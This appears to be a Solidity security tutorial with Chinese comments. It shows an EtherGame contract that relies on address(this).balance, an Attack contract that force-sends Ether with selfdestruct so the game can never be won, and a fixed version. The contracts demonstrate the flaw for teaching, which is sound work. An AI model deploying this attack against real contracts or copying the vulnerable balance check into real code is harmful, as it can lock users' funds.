// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// 这个游戏的目标是成为第 7 个存入 1 个以太币的玩家。
// 玩家一次只能存入 1 个以太币。
// 获胜者将能够提取所有的以太币。

/*
1. 部署以太游戏
2. 玩家（比如 Alice 和 Bob）决定玩，每人存入 1 个 Ether。
2.以EtherGame的地址部署Attack
3. 调用 Attack.attack 发送 5 个以太币。 这将打破游戏
    没有人能成为赢家。

发生了什么？
攻击迫使 EtherGame 的余额等于 7 ether。
现在没有人可以存款，也无法设置获胜者。
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // 你可以简单地通过发送以太来打破游戏，这样
        // 游戏余额 >= 7 ether

        // 将地址转换为应付
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

// 预防技术
// 不要依赖地址(this).balance

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
